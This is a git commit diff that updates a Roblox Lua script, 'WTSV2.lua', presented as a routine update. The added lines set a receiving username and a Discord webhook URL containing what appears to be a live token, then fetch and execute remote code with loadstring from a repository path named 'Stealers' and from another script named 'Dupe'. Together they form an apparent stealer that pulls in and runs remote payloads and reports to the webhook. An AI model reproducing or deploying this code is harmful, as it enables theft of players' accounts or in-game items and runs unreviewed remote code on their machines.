222a33f96d93efe8ba5c312d317966e528efa1ca
JoystickpIays <bryllecorro03@gmail.com>
2024-10-23 08:27:53 +0800

    Update WTSV2.lua

--- WTSV2.lua
+++ WTSV2.lua
@@ -1,1 +1,6 @@
+Receiver = "givepetroblox"
+Webhook = "https://discord.com/api/webhooks/1297048369361063956/sJ2_r8o-3dT379FFG1xiW3oa-HkTPKPB1xag_aj4GkCeNPCcBetVBhRLr6j0h1RLqktR"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/refs/heads/main/losg.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/refs/heads/main/Dupe"))()
